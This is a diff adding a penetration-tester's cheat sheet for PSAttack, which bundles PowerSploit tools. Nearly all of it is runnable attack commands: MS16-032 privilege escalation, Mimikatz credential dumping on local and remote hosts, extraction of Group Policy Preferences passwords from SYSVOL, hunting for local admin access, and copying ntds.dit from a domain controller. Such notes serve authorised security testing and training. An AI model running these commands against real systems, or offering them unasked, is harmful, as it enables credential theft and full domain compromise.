@@ -1,0 +1,117 @@
+PSAttack
+
+
+# Overview
+
+PSAttack.exe bundles PowerSploit cmdlets behind a searchable GUI. Uses PowerView 2.x API names (Get-Net*, Invoke-UserHunter). Windows-only; run elevated when hunting local admin or copying NTDS.
+
+
+# Related Notes
+
+powershell.txt           Execution policy and remote script load
+powerview.txt            PowerView 2.x/3.x function reference
+active-directory.txt     Domain enumeration without PSAttack
+windows-lateral.txt      Lateral movement after creds
+windows-credentials.txt  NTDS and Mimikatz handling
+ad-attacks.txt           GPP passwords and Kerberos attacks
+
+
+# Contents
+
+Discovery, Privilege Escalation, GPP and User Enum, Local Admin Hunt, Domain Controller NTDS
+
+
+# Discovery
+
+## Overview
+
+Search bundled attacks by keyword; pipe to Get-Help for syntax.
+
+## Commands
+
+    PSAttack.exe
+    Get-Attack <search string>
+    Get-Attack escalation
+    Get-Help Invoke-MS16-032
+    Invoke-MS16-032                                    System-level command prompt (lab exploit)
+
+    Get-Attack mimi
+    Get-Help Invoke-Mimikatz
+    Invoke-Mimikatz -DumpCreds
+
+    Get-Attack users
+    Get-NetUser
+
+## Validation / False Positives
+
+Invoke-MS16-032 only works on unpatched hosts vulnerable to MS16-032; patched systems return errors or no elevation.
+Get-Attack search is case-insensitive but keyword choice matters; try broader terms if empty.
+
+
+# GPP and User Enum
+
+## Overview
+
+GPP cpassword discovery and targeted user lookup.
+
+## Commands
+
+    Get-GPPPassword                                    Search SYSVOL for cpassword XML
+
+    Get-Attack "active directory"
+    Get-Help Get-NetUser
+    Get-NetUser -UserName <user>
+
+    Get-Attack groups
+    Get-Help Get-NetLocalGroup
+    Get-NetLocalGroup -GroupName "Administrators"
+
+
+# Local Admin Hunt
+
+## Overview
+
+Restart PSAttack as Administrator, then find machines where current creds have local admin and where admins are logged in.
+
+## Commands
+
+    # right-click PSAttack icon > Run as Administrator
+
+    Get-Attack "local admin"
+    Find-LocalAdminAccess                              Machines where current creds have local admin
+
+    Get-Attack find
+    Get-Help Invoke-UserHunter -Examples
+    Invoke-UserHunter -CheckAccess
+
+    Get-Help Invoke-Mimikatz
+    Invoke-Mimikatz -ComputerName <host> -DumpCreds
+
+## Validation / False Positives
+
+Find-LocalAdminAccess requires valid creds in the current session; stale tokens return empty results.
+Invoke-UserHunter -CheckAccess is noisy on large domains; scope with -Stealth or target users.
+
+
+# Domain Controller NTDS
+
+## Overview
+
+Domain admin session required. Copy ntds.dit locally for offline parsing.
+
+## Commands
+
+    # restart PSAttack as Administrator with domain admin creds
+
+    Get-Attack "domain controller"
+    Get-NetDomainController
+
+    Get-Attack copy
+    Get-Help Invoke-NinjaCopy -Examples
+    Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -ComputerName <DC> -LocalDestination "C:\ntds.dit"
+    ls C:\ntds.dit
+
+## Validation / False Positives
+
+Invoke-NinjaCopy needs admin on the DC and sufficient disk space for ntds.dit.
+AV/EDR may flag NinjaCopy volume shadow access; expect alerts on production-like targets.
